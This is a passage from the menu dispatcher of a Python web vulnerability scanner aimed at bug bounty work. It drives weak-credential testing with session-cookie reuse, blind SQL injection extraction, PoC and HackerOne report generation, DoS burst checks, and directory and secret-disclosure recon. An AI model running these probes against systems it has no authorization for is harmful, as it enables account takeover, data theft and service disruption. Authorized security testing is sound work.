            cli.console.print("[dim]Enter login endpoint URL (or press Enter to use target URL):[/dim]")
            login_ep = input().strip() or url
            uf = input("Username field name (default: username): ").strip() or "username"
            pf = input("Password field name (default: password): ").strip() or "password"
            cli.console.print("\n[cyan]Testing weak credentials...[/cyan]")
            hits = await auth_scanner.weak_cred_test(login_ep, uf, pf, cli.console)
            if hits:
                tree_55 = Tree(f"[bold red]🔑 Weak Credentials Found: {len(hits)}[/bold red]")
                for h in hits:
                    n = tree_55.add(f"[red]{h['username']} / {h['password']}[/red]")
                    if h["cookies"]:
                        n.add(f"[dim]Session cookies: {list(h['cookies'].keys())}[/dim]")
                        # Offer to use these cookies
                cli.console.print(tree_55)
                use = input("Use first set of cookies for authenticated scanning? (y/n): ").strip().lower()
                if use == 'y' and hits[0]["cookies"]:
                    config.cookies = hits[0]["cookies"]
                    cli.console.print("[green]✔ Session cookies applied.[/green]")
            else:
                cli.console.print("[green]✔ No weak credentials found.[/green]")

        elif mode == '56':
            url = cli.get_single_url()
            if not await check_target(url): continue
            cli.console.print("\n[cyan]Blind SQL Extractor — extracts DB name + version to confirm injection.[/cyan]")
            parsed_56 = urllib.parse.urlparse(url)
            params_56 = urllib.parse.parse_qs(parsed_56.query)
            if not params_56:
                cli.console.print("[yellow]⚠ No URL parameters found. Add parameters to URL first.[/yellow]")
            else:
                cli.console.print(f"[dim]Available params: {', '.join(params_56.keys())}[/dim]")
                param_56 = input("Which parameter to test: ").strip()
                if param_56 not in params_56:
                    cli.console.print("[red]Parameter not found in URL.[/red]")
                else:
                    with cli.console.status("[cyan]Extracting (boolean-based, ~20 chars each)...[/cyan]", spinner="dots"):
                        res_56 = await blind_sql.extract(url, param_56, cli.console)
                    if res_56["success"]:
                        tree_56 = Tree("[bold red]💉 Blind SQL Injection Confirmed[/bold red]")
                        if res_56["version"]:
                            tree_56.add(f"[yellow]DB Version : {res_56['version']}[/yellow]")
                        if res_56["db_name"]:
                            tree_56.add(f"[yellow]DB Name    : {res_56['db_name']}[/yellow]")
                        tree_56.add(f"[dim]Method     : {res_56['method']}[/dim]")
                        cli.console.print(tree_56)
                    else:
                        cli.console.print(f"[dim]Result: {res_56['method']}[/dim]")

        elif mode == '57':
            cli.console.print("\n[cyan]PoC Generator — paste a vulnerability URL and details:[/cyan]")
            cli.console.print("[dim]This generates curl + Python PoC code for a finding.[/dim]")
            poc_url   = input("Vulnerable URL: ").strip()
            poc_param = input("Parameter name: ").strip()
            poc_type  = input("Vuln type (sqli/xss/ssrf/lfi/rce/other): ").strip().lower()
            poc_payload = input("Payload used: ").strip()
            # Map string to VulnType
            _type_map = {
                "sqli": VulnerabilityType.SQLI, "xss": VulnerabilityType.XSS,
                "ssrf": VulnerabilityType.SSRF, "lfi": VulnerabilityType.LFI,
                "rce":  VulnerabilityType.RCE,  "other": VulnerabilityType.SENSITIVE,
            }
            vt_57 = _type_map.get(poc_type, VulnerabilityType.SQLI)
            v_57  = VulnerabilityResult(
                url=poc_url, vulnerability_type=vt_57,
                severity="HIGH", vulnerable_params=[poc_param],
                payload_used=poc_payload,
                evidence="Manual entry", details="User-provided finding",
            )
            code = PoCGenerator.generate(v_57)
            cvss_57 = CVSSScorer.score(v_57)
            cli.console.print(f"\n[dim]CVSS Score: {cvss_57['score']} ({cvss_57['rating']})[/dim]")
            cli.console.print(f"[dim]Vector:     {cvss_57['vector']}[/dim]\n")
            cli.console.print(Panel(code, title="[cyan]Generated PoC[/cyan]",
                                    border_style="cyan", expand=False))
            # Save
            rd, _ = FileHandler.get_output_dirs()
            out_f  = rd / f"poc_{datetime.now().strftime('%H%M%S')}.txt"
            with open(out_f, 'w') as f:
                f.write(f"CVSS: {cvss_57['score']} ({cvss_57['rating']})\n")
                f.write(f"Vector: {cvss_57['vector']}\n\n")
                f.write(code)
            cli.console.print(f"[green]✔ Saved → {out_f}[/green]")

        elif mode == '58':
            cli.console.print("\n[cyan]HTML Report Generator[/cyan]")
            cli.console.print("[dim]Enter path to a Y2S JSON result file:[/dim]")
            json_path = input("JSON file path: ").strip()
            if not json_path or not Path(json_path).exists():
                cli.console.print("[red]File not found.[/red]")
            else:
                try:
                    with open(json_path) as f:
                        data = json.load(f)
                    # Build minimal result objects for report
                    from dataclasses import fields as dc_fields
                    mock_results = []
                    for entry in (data if isinstance(data, list) else [data]):
                        r = ComprehensiveScanResult(
                            url=entry.get('url',''),
                            timestamp=entry.get('timestamp', datetime.now().isoformat()),
                            overall_verdict=Verdict(entry.get('overall_verdict', 'UNKNOWN')),
                        )
                        mock_results.append(r)
                    out_path = json_path.replace('.json', '.html')
                    HTMLReportGenerator.generate(mock_results, out_path)
                    cli.console.print(f"[green]✔ HTML report → {out_path}[/green]")
                except Exception as e:
                    cli.console.print(f"[red]Error: {e}[/red]")

        elif mode == '59':
            url = cli.get_single_url()
            if not await check_target(url): continue
            _rl_checker = RateLimitDoSChecker(config, cli.console)
            rl = await _rl_checker.check_rate_limiting(url)
            _t59 = Tree(f"[cyan]⏱ Rate Limit — {url[:60]}[/cyan]")
            _col = 'green' if rl['has_rate_limit'] else 'red'
            _t59.add(f"Detected : [{_col}]{'Yes ✓' if rl['has_rate_limit'] else 'No ✗'}[/{_col}]")
            if rl['triggered_at']: _t59.add(f"Triggered at req #{rl['triggered_at']}")
            if rl['rate_limit_header']: _t59.add(f"RL Headers: [cyan]{rl['rate_limit_header']}[/cyan]")
            _t59.add(f"Details: {rl['details']}")
            cli.console.print(_t59)

        elif mode == '60':
            url = cli.get_single_url()
            if not await check_target(url): continue
            _dos_checker = RateLimitDoSChecker(config, cli.console)
            dos = await _dos_checker.check_dos_protection(url)
            _t60 = Tree(f"[cyan]🛡 DoS Protection — {url[:60]}[/cyan]")
            _col2 = 'green' if dos['protected'] else 'red'
            _t60.add(f"Protected : [{_col2}]{'Yes ✓' if dos['protected'] else 'No ✗'}[/{_col2}]")
            _sc60 = dos.get('burst_responses', [])
            _t60.add(f"Burst: 2xx={sum(1 for s in _sc60 if 200<=s<300)}, blocked={sum(1 for s in _sc60 if s in (429,503))}")
            _t60.add(f"Post-burst status: {dos['post_burst_status']}")
            _t60.add(f"Details: {dos['details']}")
            cli.console.print(_t60)

        elif mode == '61':
            cli.console.print("\n[cyan]HackerOne Report Generator[/cyan]")
            _h1_url   = input("Vulnerable URL     : ").strip()
            _h1_param = input("Parameter          : ").strip()
            _h1_type  = input("Vuln type (sqli/xss/rce/lfi/ssrf): ").strip()
            _h1_sev   = (input("Severity (CRITICAL/HIGH/MEDIUM/LOW): ").strip().upper() or "HIGH")
            _h1_pay   = input("Payload            : ").strip()
            _h1_ev    = input("Evidence           : ").strip()
            _h1_imp   = input("Impact (Enter=skip): ").strip()
            _tmap61   = {"sql":"SQLI","sqli":"SQLI","xss":"XSS","rce":"RCE","lfi":"LFI","ssrf":"SSRF","idor":"IDOR","csrf":"CSRF"}
            _vkey61   = _tmap61.get(_h1_type.lower().replace(" ","")[:4], "SENSITIVE")
            try: _vt61 = VulnerabilityType[_vkey61]
            except: _vt61 = VulnerabilityType.SENSITIVE
            _mock61 = VulnerabilityResult(
                url=_h1_url, vulnerability_type=_vt61, severity=_h1_sev,
                vulnerable_params=[_h1_param], payload_used=_h1_pay,
                evidence=_h1_ev, details="", subtype=_h1_type, impact=_h1_imp)
            _rd61, _ = FileHandler.get_output_dirs()
            _h1dir61 = _rd61.parent / "h1_reports"
            _fname61 = HackerOneReportGenerator.save_report(_mock61, _h1_url, _h1dir61)
            cli.console.print(f"[green]✔ H1 Report saved → {_fname61}[/green]")
            _lines61 = _fname61.read_text().split('\n')[:20]
            cli.console.print("\n".join(_lines61))

        # ── Mode 62 — Recon + Param Discovery + Info Disclosure ───────────────
        elif mode == '62':
            url62 = cli.get_single_url()

            cli.console.print(
                "\n[bold cyan]╔══════════════════════════════════════════════════╗[/bold cyan]"
            )
            cli.console.print(
                "[bold cyan]║   Mode 62 — Recon + Param Discovery + Info Disclosure   ║[/bold cyan]"
            )
            cli.console.print(
                "[bold cyan]╚══════════════════════════════════════════════════╝[/bold cyan]"
            )
            cli.console.print(
                "[dim]  Three parallel tasks:[/dim]\n"
                "[dim]  1. Parameter Discovery  — hidden GET/POST params, JS-extracted names[/dim]\n"
                "[dim]  2. Directory Enumeration — files, dirs, backups, sensitive paths[/dim]\n"
                "[dim]  3. Information Disclosure — headers, API keys, stack traces, source maps,[/dim]\n"
                "[dim]                              robots.txt secrets, debug params, error leaks[/dim]\n"
            )

            # WAF check before scanning
            waf62 = await waf_detector.detect(url62)
            if waf62["detected"]:
                wc62 = "red" if waf62["confidence"] == "high" else "yellow"
                cli.console.print(
                    f"[{wc62}]  WAF detected: {waf62['waf'] or 'Unknown'} "
                    f"(confidence: {waf62['confidence']})[/{wc62}]"
                )

            with cli.console.status(
                "[bold cyan]  Running recon... (this may take 30–90 seconds)[/bold cyan]",
                spinner="dots"
            ):
                result62 = await recon_scanner.run(url62)

            recon_scanner.display(result62)

            # Auto-save JSON
            saved62 = recon_scanner.save(result62)
            cli.console.print(f"\n[green]✔ Recon JSON saved → {saved62}[/green]")

            # Summary of actionable findings
            disc62   = result62.get("disclosure", [])
            crit62   = [d for d in disc62 if d["severity"] in ("CRITICAL", "HIGH")]
            dirs62   = result62.get("directories", [])
            high_dirs62 = [d for d in dirs62 if d["severity"] == "HIGH"]

            if crit62 or high_dirs62:
                cli.console.print(
                    "\n[bold red]  Actionable Findings for Bug Report:[/bold red]"
                )
                for item in crit62:
                    cli.console.print(
                        f"  [red][{item['severity']}][/red] {item['type']} — "
                        f"{item['location']}"
                    )
                for item in high_dirs62:
                    cli.console.print(
                        f"  [red][HIGH][/red] Sensitive path accessible — "
                        f"{item['url']}  (HTTP {item['status']})"
                    )

            # Offer to run vuln scans on discovered params
            get_params62 = result62.get("parameters", {}).get("get_params", [])
            if get_params62:
                cli.console.print(
                    f"\n[cyan]  Found {len(get_params62)} hidden GET parameter(s): "
                    f"{', '.join(p['name'] for p in get_params62[:8])}"
                    f"{'...' if len(get_params62) > 8 else ''}[/cyan]"
                )
                cli.console.print(
                    "[dim]  Tip: copy the discovered params into your target URL "
                    "and run mode 1 or 99 to scan for injection vulnerabilities.[/dim]"
                )
            beep(1)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting..")
        sys.exit(0)
        